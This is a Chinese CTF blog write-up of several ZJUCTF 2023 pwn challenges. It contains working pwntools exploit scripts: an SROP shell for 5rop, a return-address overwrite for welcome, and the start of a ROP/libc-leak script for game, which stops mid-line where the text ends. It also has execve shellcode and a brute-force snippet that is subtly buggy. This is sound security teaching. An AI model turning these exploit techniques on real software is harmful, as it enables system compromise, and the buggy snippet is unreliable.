<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>2023-ZJUCTF-Pwn(Partial) | 晚栀wingee~</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  
  
  
  <meta name="description" content="引言: 2023年ZJUCTF-Pwn方向部分题题解，包含5rop，welcome，nya，game，logger，drawer。考点基本在栈和数组溢出上。其中有些题目支持本地环境可以在本地复现出来，有些题目需要远程打不能复现。Pwn方向的题难度真的好大…有哪里写的不对的地方还请指出呜呜">
<meta property="og:type" content="article">
<meta property="og:title" content="2023-ZJUCTF-Pwn(Partial)">
<meta property="og:url" content="http://47.96.29.144/2023/11/25/ZJUCTF-Pwn-Partial/index.html">
<meta property="og:site_name" content="晚栀wingee~">
<meta property="og:description" content="引言: 2023年ZJUCTF-Pwn方向部分题题解，包含5rop，welcome，nya，game，logger，drawer。考点基本在栈和数组溢出上。其中有些题目支持本地环境可以在本地复现出来，有些题目需要远程打不能复现。Pwn方向的题难度真的好大…有哪里写的不对的地方还请指出呜呜">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://47.96.29.144/2023/11/25/ZJUCTF-Pwn-Partial/ZJUCTF-Pwn-Partial%5Cimage-20231124171745428.png">
<meta property="og:image" content="http://47.96.29.144/2023/11/25/ZJUCTF-Pwn-Partial/ZJUCTF-Pwn-Partial%5Cimage-20231124171901400.png">
<meta property="og:image" content="http://47.96.29.144/2023/11/25/ZJUCTF-Pwn-Partial/ZJUCTF-Pwn-Partial%5Cimage-20231124173814621.png">
<meta property="og:image" content="http://47.96.29.144/2023/11/25/ZJUCTF-Pwn-Partial/ZJUCTF-Pwn-Partial%5Cimage-20231124180010167.png">
<meta property="og:image" content="http://47.96.29.144/2023/11/25/ZJUCTF-Pwn-Partial/ZJUCTF-Pwn-Partial%5Cimage-20231124181058907.png">
<meta property="og:image" content="http://47.96.29.144/2023/11/25/ZJUCTF-Pwn-Partial/ZJUCTF-Pwn-Partial%5Cimage-20231124181228911.png">
<meta property="og:image" content="http://47.96.29.144/2023/11/25/ZJUCTF-Pwn-Partial/ZJUCTF-Pwn-Partial%5Cimage-20231124181511153.png">
<meta property="og:image" content="http://47.96.29.144/2023/11/25/ZJUCTF-Pwn-Partial/ZJUCTF-Pwn-Partial%5Cimage-20231124184018140.png">
<meta property="og:image" content="http://47.96.29.144/2023/11/25/ZJUCTF-Pwn-Partial/ZJUCTF-Pwn-Partial%5Cimage-20231124184203677.png">
<meta property="og:image" content="http://47.96.29.144/2023/11/25/ZJUCTF-Pwn-Partial/ZJUCTF-Pwn-Partial%5Cimage-20231124204908787.png">
<meta property="og:image" content="http://47.96.29.144/2023/11/25/ZJUCTF-Pwn-Partial/ZJUCTF-Pwn-Partial%5Cimage-20231124210628947.png">
<meta property="og:image" content="http://47.96.29.144/2023/11/25/ZJUCTF-Pwn-Partial/ZJUCTF-Pwn-Partial%5Cimage-20231124214646349.png">
<meta property="og:image" content="http://47.96.29.144/2023/11/25/ZJUCTF-Pwn-Partial/ZJUCTF-Pwn-Partial%5Cimage-20231124215450771.png">
<meta property="og:image" content="http://47.96.29.144/2023/11/25/ZJUCTF-Pwn-Partial/ZJUCTF-Pwn-Partial%5Cimage-20231124220847019.png">
<meta property="og:image" content="http://47.96.29.144/2023/11/25/ZJUCTF-Pwn-Partial/ZJUCTF-Pwn-Partial%5Cimage-20231124220946195.png">
<meta property="og:image" content="http://47.96.29.144/2023/11/25/ZJUCTF-Pwn-Partial/ZJUCTF-Pwn-Partial%5Cimage-20231124221357192.png">
<meta property="og:image" content="http://47.96.29.144/2023/11/25/ZJUCTF-Pwn-Partial/ZJUCTF-Pwn-Partial%5Cimage-20231124223643167.png">
<meta property="og:image" content="http://47.96.29.144/2023/11/25/ZJUCTF-Pwn-Partial/ZJUCTF-Pwn-Partial%5Cimage-20231124225952306.png">
<meta property="og:image" content="http://47.96.29.144/2023/11/25/ZJUCTF-Pwn-Partial/ZJUCTF-Pwn-Partial%5Cimage-20231124230650860.png">
<meta property="og:image" content="http://47.96.29.144/2023/11/25/ZJUCTF-Pwn-Partial/ZJUCTF-Pwn-Partial%5Cimage-20231124231058876.png">
<meta property="og:image" content="http://47.96.29.144/2023/11/25/ZJUCTF-Pwn-Partial/ZJUCTF-Pwn-Partial%5Cimage-20231124231240505.png">
<meta property="og:image" content="http://47.96.29.144/2023/11/25/ZJUCTF-Pwn-Partial/ZJUCTF-Pwn-Partial%5Cimage-20231124231816529.png">
<meta property="og:image" content="http://47.96.29.144/2023/11/25/ZJUCTF-Pwn-Partial/ZJUCTF-Pwn-Partial%5Cimage-20231124232035449.png">
<meta property="og:image" content="http://47.96.29.144/2023/11/25/ZJUCTF-Pwn-Partial/ZJUCTF-Pwn-Partial%5Cimage-20231124232307588.png">
<meta property="og:image" content="http://47.96.29.144/2023/11/25/ZJUCTF-Pwn-Partial/ZJUCTF-Pwn-Partial%5Cimage-20231125001600696.png">
<meta property="og:image" content="http://47.96.29.144/2023/11/25/ZJUCTF-Pwn-Partial/ZJUCTF-Pwn-Partial%5Cimage-20231125002630022.png">
<meta property="og:image" content="http://47.96.29.144/2023/11/25/ZJUCTF-Pwn-Partial/ZJUCTF-Pwn-Partial%5Cimage-20231125004134370.png">
<meta property="og:image" content="http://47.96.29.144/2023/11/25/ZJUCTF-Pwn-Partial/ZJUCTF-Pwn-Partial%5Cimage-20231125123440945.png">
<meta property="og:image" content="http://47.96.29.144/2023/11/25/ZJUCTF-Pwn-Partial/ZJUCTF-Pwn-Partial%5Cimage-20231125124811814.png">
<meta property="article:published_time" content="2023-11-25T05:13:32.000Z">
<meta property="article:modified_time" content="2023-11-25T05:25:57.762Z">
<meta property="article:tag" content="Pwn">
<meta property="article:tag" content="ZJUCTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://47.96.29.144/2023/11/25/ZJUCTF-Pwn-Partial/ZJUCTF-Pwn-Partial%5Cimage-20231124171745428.png">
  
    <link rel="alternate" href="/atom.xml" title="晚栀wingee~" type="application/atom+xml">
  
  
    <link rel="icon" href="/images/avatar.jpg">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="/css/style.css">

  
<link rel="stylesheet" href="/css/highlight.css">

<meta name="generator" content="Hexo 7.0.0"><style>mjx-container[jax="SVG"] {
  direction: ltr;
}

mjx-container[jax="SVG"] > svg {
  overflow: visible;
}

mjx-container[jax="SVG"][display="true"] {
  display: block;
  text-align: center;
  margin: 1em 0;
}

mjx-container[jax="SVG"][justify="left"] {
  text-align: left;
}

mjx-container[jax="SVG"][justify="right"] {
  text-align: right;
}

g[data-mml-node="merror"] > g {
  fill: red;
  stroke: red;
}

g[data-mml-node="merror"] > rect[data-background] {
  fill: yellow;
  stroke: none;
}

g[data-mml-node="mtable"] > line[data-line] {
  stroke-width: 70px;
  fill: none;
}

g[data-mml-node="mtable"] > rect[data-frame] {
  stroke-width: 70px;
  fill: none;
}

g[data-mml-node="mtable"] > .mjx-dashed {
  stroke-dasharray: 140;
}

g[data-mml-node="mtable"] > .mjx-dotted {
  stroke-linecap: round;
  stroke-dasharray: 0,140;
}

g[data-mml-node="mtable"] > svg {
  overflow: visible;
}

[jax="SVG"] mjx-tool {
  display: inline-block;
  position: relative;
  width: 0;
  height: 0;
}

[jax="SVG"] mjx-tool > mjx-tip {
  position: absolute;
  top: 0;
  left: 0;
}

mjx-tool > mjx-tip {
  display: inline-block;
  padding: .2em;
  border: 1px solid #888;
  font-size: 70%;
  background-color: #F8F8F8;
  color: black;
  box-shadow: 2px 2px 5px #AAAAAA;
}

g[data-mml-node="maction"][data-toggle] {
  cursor: pointer;
}

mjx-status {
  display: block;
  position: fixed;
  left: 1em;
  bottom: 1em;
  min-width: 25%;
  padding: .2em .4em;
  border: 1px solid #888;
  font-size: 90%;
  background-color: #F8F8F8;
  color: black;
}

foreignObject[data-mjx-xml] {
  font-family: initial;
  line-height: normal;
  overflow: visible;
}

.MathJax path {
  stroke-width: 3;
}

mjx-container[display="true"] {
  overflow: auto hidden;
}

mjx-container[display="true"] + br {
  display: none;
}
</style></head>

<body>
  <div id="fullpage" class="mobile-nav-right">
    
      <div id="wrapper" title="图片来自网络">
    
    
      <header id="header">
  <div id="nav-toggle" class="nav-toggle"></div>
  <div class="head-box global-width">
    <nav class="nav-box nav-right">
      
        <a class="nav-item" href="/" title
        
        >首页</a>
      
        <a class="nav-item" href="/archives" title
        
        >归档</a>
      
        <a class="nav-item" href="/introduction" title
        
        >关于我</a>
      
        <a class="nav-item" href="/log" title
        
        >站点日志</a>
      
    </nav>
  </div>
</header>
      <div id="middlecontent" title class="global-width sidebar-right">
        <section id="main"><article id="post-ZJUCTF-Pwn-Partial" class="article global-container article-type-post" itemscope itemprop="blogPost">
  
    <header class="article-header">
      
  
    <h1 class="article-title" itemprop="name">
      2023-ZJUCTF-Pwn(Partial)
    </h1>
  

    </header>
  
  <div class="article-meta">
    <a href="/2023/11/25/ZJUCTF-Pwn-Partial/" class="article-date">
  <time datetime="2023-11-25T05:13:32.000Z" itemprop="datePublished">2023-11-25</time>
</a>
    
    
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ZJUCTF/" rel="tag">ZJUCTF</a></li></ul>

  </div>
  
    <span id="busuanzi_container_page_pv">
      本文总阅读量<span id="busuanzi_value_page_pv"></span>次
    </span>
  

  <div class="article-inner">
    
    <div class="article-content article-content-cloud" itemprop="articleBody">
      
        <script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>
<h3 id="引言">引言:</h3>
<p>2023年ZJUCTF-Pwn方向部分题题解，包含5rop，welcome，nya，game，logger，drawer。考点基本在栈和数组溢出上。其中有些题目支持本地环境可以在本地复现出来，有些题目需要远程打不能复现。Pwn方向的题难度真的好大…有哪里写的不对的地方还请指出呜呜</p>
<span id="more"></span>
<h3 id="1-1-5rop">1.1 5rop</h3>
<p>用IDA反汇编，打开，一览无遗…</p>
<p><img src="/2023/11/25/ZJUCTF-Pwn-Partial/ZJUCTF-Pwn-Partial%5Cimage-20231124171745428.png" alt="image-20231124171745428"></p>
<p>观察代码段，发现一处栈溢出：</p>
<p><img src="/2023/11/25/ZJUCTF-Pwn-Partial/ZJUCTF-Pwn-Partial%5Cimage-20231124171901400.png" alt="image-20231124171901400"></p>
<p>只有一处栈溢出那应该是rop。但由于程序使用了sys_read（内核函数），没有可以利用的GOT和PLT，所以肯定不是常规的Rop。</p>
<p>再找一下程序中还有没有其他可以利用的地方，发现：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>.text:0000000000401015 pop rax; retn</code></p>
</li>
<li class="lvl-2">
<p><code>0x402000 /bin/sh</code></p>
</li>
<li class="lvl-2">
<p><code>0x401012 syscall;ret</code></p>
</li>
</ul>
<p>现在明确：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>rax</code>可控，可以用来盛装系统调用号</p>
</li>
<li class="lvl-2">
<p><code>syscall</code>代码碎片可以利用（因其后有ret），配合rax可以触发任意系统调用</p>
</li>
<li class="lvl-2">
<p><code>/bin/sh</code>字符串存在，可以想办法把地址放进rdi里，配合<code>syscall</code>getshell</p>
</li>
</ul>
<p>目前的难点在于我们如何把<code>/bin/sh</code>的地址放到rdi里。一想到控寄存器，就想到Srop。</p>
<p>在触发系统调用时，操作系统会将程序从用户态切换到内核态，需要将所有寄存器压入栈中以保存上下文，以便在结束系统调用时可以恢复程序的状态。</p>
<p>有没有什么联系？寄存器？栈？由于栈是可控的，所以我们可以通过对栈的排布，让操作系统在恢复上下文的时候将栈上指定的值pop到我们需要的寄存器中。</p>
<p><img src="/2023/11/25/ZJUCTF-Pwn-Partial/ZJUCTF-Pwn-Partial%5Cimage-20231124173814621.png" alt="image-20231124173814621"></p>
<p>（图源CTF-wiki）</p>
<p>幸运的是pwntools集成了Srop的工具。</p>
<p>下面再来碎碎念一下，作为一名合格（不了一点）的Pwn人需要随时都能背出shellcode</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MIPSASM"><figure class="iseeu highlight /mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mov rax, <span class="number">0x3b</span> <span class="comment">; 系统调用号</span></span><br><span class="line">mov rdi, <span class="keyword">sh_address</span></span><br><span class="line"><span class="keyword"></span>mov rsi, <span class="number">0</span></span><br><span class="line">mov rdx, <span class="number">0</span></span><br><span class="line">mov rcx, <span class="number">0</span></span><br><span class="line">mov rbx, <span class="number">0</span></span><br><span class="line"><span class="keyword">syscall </span><span class="comment">; execve("/bin/sh", 0, 0);</span></span><br></pre></td></tr></table></figure></div>
<p>利用15系统调用号触发Srop，payload如下：</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = remote("ctfenv.zjusec.net", 45115)</span></span><br><span class="line">p = process(<span class="string">"./chall"</span>)</span><br><span class="line">start = <span class="number">0x402000</span></span><br><span class="line"><span class="comment"># 0x0000000000401015 : pop rax ; ret</span></span><br><span class="line">pop_rax = <span class="number">0x401015</span></span><br><span class="line">syscall_ret = <span class="number">0x401012</span></span><br><span class="line">sh_address = <span class="number">0x402000</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">59</span></span><br><span class="line">frame.rdi = sh_address</span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rip = syscall_ret</span><br><span class="line"></span><br><span class="line">payload = p64(pop_rax) + p64(<span class="number">15</span>) + p64(syscall_ret) + <span class="built_in">bytes</span>(frame)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>拿到shell</p>
<p><img src="/2023/11/25/ZJUCTF-Pwn-Partial/ZJUCTF-Pwn-Partial%5Cimage-20231124180010167.png" alt="image-20231124180010167"></p>
<h3 id="1-2-nya">1.2 nya</h3>
<p>丢进IDA反汇编，运行一下</p>
<p><img src="/2023/11/25/ZJUCTF-Pwn-Partial/ZJUCTF-Pwn-Partial%5Cimage-20231124181058907.png" alt="image-20231124181058907"></p>
<p><img src="/2023/11/25/ZJUCTF-Pwn-Partial/ZJUCTF-Pwn-Partial%5Cimage-20231124181228911.png" alt="image-20231124181228911"></p>
<p>分析了一下，程序的主逻辑就是循环25次，每次可以给人物不同的属性加点，根据输入数字的不同，每次加的点数随机，甚至还会有其他的属性被扣点。当每个属性的点数到999就可以拿到flag了。</p>
<p><strong>但经过尝试，发现如果循规蹈矩，25次甚至连一个属性都加不满。</strong></p>
<p>看左侧的函数栏，发现每次加点的多少其实是由不同的函数处理的。</p>
<p>根据加点的多少，从小到大分为：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>success</p>
</li>
<li class="lvl-2">
<p>great success</p>
</li>
<li class="lvl-2">
<p>unbelievable success</p>
</li>
<li class="lvl-2">
<p>unexpected</p>
<p>**其中unexpected函数的加点是固定的——给每个属性都加6点。这点很重要，之后要用到。**但是很显然，就算加6点，25次循环也不可能到999。</p>
</li>
</ul>
<p><img src="/2023/11/25/ZJUCTF-Pwn-Partial/ZJUCTF-Pwn-Partial%5Cimage-20231124181511153.png" alt="image-20231124181511153"></p>
<p>观察train函数，我们先输入一个lucky number，程序对该数字进行操作，最后用处理结果通过roll函数给属性加点。</p>
<p>roll函数如下：</p>
<p><img src="/2023/11/25/ZJUCTF-Pwn-Partial/ZJUCTF-Pwn-Partial%5Cimage-20231124184018140.png" alt="image-20231124184018140"></p>
<p>rand随机数…又来？又对数据进行了处理，根据处理结果分不同的函数加点。通过尝试发现，加点最多的是unbelievable success</p>
<p>通过多次尝试，偶然触发了一次：</p>
<p><img src="/2023/11/25/ZJUCTF-Pwn-Partial/ZJUCTF-Pwn-Partial%5Cimage-20231124184203677.png" alt="image-20231124184203677"></p>
<p>但是概率实在是太低了，按照正常的方法肯定不行。</p>
<p>所以，为了让每次都能触发usuccess，必须保证：</p>
<p><strong>每次的v6都大于100–&gt; 每次的train函数处理结果足够小</strong></p>
<p><strong>好好好，正片开始：</strong></p>
<p>train的处理结果是一个16位的short int类型的数据，这里我们把它分为高八位和低八位（下面将该数据称为result）</p>
<h4 id="readstr-函数off-by-NULL">readstr() 函数off by NULL</h4>
<p>看readstr函数</p>
<p><img src="/2023/11/25/ZJUCTF-Pwn-Partial/ZJUCTF-Pwn-Partial%5Cimage-20231124204908787.png" alt="image-20231124204908787"></p>
<p>很明显的off by null。程序规定输入字符串的长一定小于3，如果大于3，会在第4位处添加0x00字符截断。</p>
<p>观察train函数，发现读入的string与result的在栈上的地址相邻，也就是说，这里的off by null会将result的低八位覆盖为0</p>
<p>只要我们在Yes or NO 的时候输入YYYY就OK。</p>
<p><img src="/2023/11/25/ZJUCTF-Pwn-Partial/ZJUCTF-Pwn-Partial%5Cimage-20231124210628947.png" alt="image-20231124210628947"></p>
<p>至于高八位，再次观察train函数：</p>
<p><img src="/2023/11/25/ZJUCTF-Pwn-Partial/ZJUCTF-Pwn-Partial%5Cimage-20231124214646349.png" alt="image-20231124214646349"></p>
<p>只要保证v0为0，就可以让result高八位为0。</p>
<p>因为要求一个相对于0xFFFF的逆元，把v3爆破出来：</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="number">1</span>){</span><br><span class="line">    v = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span>((<span class="number">0xCAFE</span> * v - <span class="number">0x4542</span> % <span class="number">0x10000</span>)==<span class="number">0</span>) <span class="keyword">break</span></span><br><span class="line">    v += <span class="number">1</span></span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
<p>求出v3 = 18</p>
<p>好了，完事具备~</p>
<p>前几次我们要去触发usuccess</p>
<p>运行程序，见证奇迹：</p>
<p><img src="/2023/11/25/ZJUCTF-Pwn-Partial/ZJUCTF-Pwn-Partial%5Cimage-20231124215450771.png" alt="image-20231124215450771"></p>
<p>再来几次，发现到最后没法把所有的属性同时变成999</p>
<p><img src="/2023/11/25/ZJUCTF-Pwn-Partial/ZJUCTF-Pwn-Partial%5Cimage-20231124220847019.png" alt="image-20231124220847019"></p>
<p>这时候利用off by NULL 触发 unexpected success，成功get flag（本地环境无flag）</p>
<p><img src="/2023/11/25/ZJUCTF-Pwn-Partial/ZJUCTF-Pwn-Partial%5Cimage-20231124220946195.png" alt="image-20231124220946195"></p>
<h3 id="1-3-Welcome">1.3 Welcome</h3>
<p>扔进IDA反汇编</p>
<p>程序的大意的现在有一个长度为8的数组，现在指针指在数组的第一位，通过<code>A,D</code>左右移动指针的位置，通过<code>W,S</code>来使指针指向的数字加1或减一。其中backdoor函数是后门函数，我们只需利用一些手段让程序执行backdoor就好~</p>
<p><img src="/2023/11/25/ZJUCTF-Pwn-Partial/ZJUCTF-Pwn-Partial%5Cimage-20231124221357192.png" alt="image-20231124221357192"></p>
<p>嗯，一打开就知道是经典的数组溢出的题型。我猜应该没有限制输入的下标叭，那岂不是可以任意修改栈地址和返回地址（笑）</p>
<p>+++</p>
<p>由于S数组布置在栈上，因为它没有限制下标，所以我们可以去任意修改S[n&gt;8]和S[n&lt;0]位置的数字。</p>
<p>这里还走了点弯路，由于本题开了地址随机化，我们只能去根据函数地址之间的偏移去对返回地址进行修改。一开始只想着从S数组往下修改了，即修改main函数的返回地址到backdoor，找了一半天<code>libc_start_main_ret</code>，才想起来这个b东西是内核地址，<code>libc</code>加载的基址都不知道，改毛线。</p>
<p>后来受学长的点拨，才回过味来，向下修改不行可以向上修改。</p>
<p><strong>正片开始：</strong></p>
<p>发现本题的输入可以是字符串，然后main函数调用process函数，按照从前往后的顺序按位处理字符。也就是说，当main函数调用process的时候，栈空间如下：</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GHERKIN"><figure class="iseeu highlight /gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">|<span class="string"> space for 'process' </span>|</span><br><span class="line">|<span class="string">---------------------</span>|</span><br><span class="line">|<span class="string">         rbp         </span>|<span class="string"> 8 bytes</span></span><br><span class="line"><span class="string"></span>|<span class="string">---------------------</span>|</span><br><span class="line">|<span class="string"> retaddr of 'process'</span>|<span class="string"> 8 bytes         </span></span><br><span class="line"><span class="string"></span>|<span class="string">---------------------</span>|</span><br><span class="line">|<span class="string">          i          </span>|<span class="string"> 8 bytes</span></span><br><span class="line"><span class="string"></span>|<span class="string">---------------------</span>|</span><br><span class="line">|<span class="string">         s[8]        </span>|<span class="string"> 8 bytes &lt;- pointer</span></span><br></pre></td></tr></table></figure></div>
<p>所以，我们只需要让process自己改自己就好了。即移动指针，修改retaddr of 'process’为backdoor</p>
<p>明确，process的返回地址是在main函数中，<code>call process</code>的后一条汇编指令的地址即<code>0x1591</code></p>
<p>(这里所说的地址其实是相对start函数基址的偏移量)</p>
<p><img src="/2023/11/25/ZJUCTF-Pwn-Partial/ZJUCTF-Pwn-Partial%5Cimage-20231124223643167.png" alt="image-20231124223643167"></p>
<p>backdoor的地址为<code>0x1289</code></p>
<p>算偏移改地址就OK</p>
<p>EXP：</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line"><span class="comment"># p = remote("ctfenv.zjusec.net", 41533)</span></span><br><span class="line">p = process(<span class="string">"./welcome"</span>)</span><br><span class="line"><span class="comment"># 0000000000001591</span></span><br><span class="line"><span class="comment"># 1289</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">payload = <span class="string">b"A"</span> * <span class="number">24</span> + <span class="string">b"S"</span> * <span class="number">2</span> + <span class="string">b"D"</span> + <span class="string">b"S"</span> * <span class="number">3</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;"</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = b"S" * 2 + b"A" + b"S" * 3</span></span><br><span class="line"><span class="comment"># p.sendlineafter("&gt;", payload)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>get shell</p>
<p><img src="/2023/11/25/ZJUCTF-Pwn-Partial/ZJUCTF-Pwn-Partial%5Cimage-20231124225952306.png" alt="image-20231124225952306"></p>
<h3 id="1-4-game">1.4 game</h3>
<p>可以说是上一题的考点+ROP。扔进IDA反汇编</p>
<p><img src="/2023/11/25/ZJUCTF-Pwn-Partial/ZJUCTF-Pwn-Partial%5Cimage-20231124230650860.png" alt="image-20231124230650860"></p>
<p>本程序的大意就是跟对面下棋，赢了就会调用win_game的函数，输了就寄了。在win_game里让你输入一个字符串（名字）会有一个栈的溢出点。</p>
<p>很明显，本题先要把对面赢了，然后在win_game里ROP，获取shell。</p>
<p><img src="/2023/11/25/ZJUCTF-Pwn-Partial/ZJUCTF-Pwn-Partial%5Cimage-20231124231058876.png" alt="image-20231124231058876"></p>
<p>运行下程序，好好好，直接往中间下是吧，这赢个鬼。</p>
<p><img src="/2023/11/25/ZJUCTF-Pwn-Partial/ZJUCTF-Pwn-Partial%5Cimage-20231124231240505.png" alt="image-20231124231240505"></p>
<p>看下胜利的判断条件，发现有一个全局变量<code>byte_4061</code>，其置1表示游戏胜利。并且我们发现，该棋盘其实是一个数组，下棋的过程实际上就是使数组下标为<code>3 * row + column</code>的数字置1 。**尝试下负数，发现可以，不会报错。**那现在去找数组地址和<code>byte_4061</code>地址的偏差，用welcome中的思路，把<code>byte_4061</code>改成1就好了。</p>
<p><img src="/2023/11/25/ZJUCTF-Pwn-Partial/ZJUCTF-Pwn-Partial%5Cimage-20231124231816529.png" alt="image-20231124231816529"></p>
<p>数组首地址为<code>0x4074</code>,偏移19，拆解因数<code>3 * 6 + 1 * 1</code></p>
<p>试运行，完全OK</p>
<p><img src="/2023/11/25/ZJUCTF-Pwn-Partial/ZJUCTF-Pwn-Partial%5Cimage-20231124232035449.png" alt="image-20231124232035449"></p>
<p>好好好，下面就是利用栈溢出ROP了。由于开了地址随机化，我们不能找到start函数的基址，也不能直接调用puts等函数，所以需要ROP三次。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>第一次，填满<code>win_game_retaddr</code>以上的栈空间，利用演员<code>printf</code>顺势拉出<code>win_game</code>函数的返回地址。通过该返回地址与地址偏移量，计算start基址与任意已调函数的<code>GOT</code>与<code>PLT</code>。</p>
</li>
<li class="lvl-2">
<p>第二次，利用经典的ROP调用链，泄露libc中函数的地址，根据libc文件中函数地址的偏移，计算libc基址</p>
</li>
</ul>
<p><img src="/2023/11/25/ZJUCTF-Pwn-Partial/ZJUCTF-Pwn-Partial%5Cimage-20231124232307588.png" alt="image-20231124232307588"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>第三次，利用libc基址和<code>one_gadget</code>，计算<code>execve</code>函数地址，覆盖<code>win_game</code>函数返回地址，get_shell。</p>
</li>
</ul>
<p>EXP：</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = remote("ctfenv.zjusec.net", 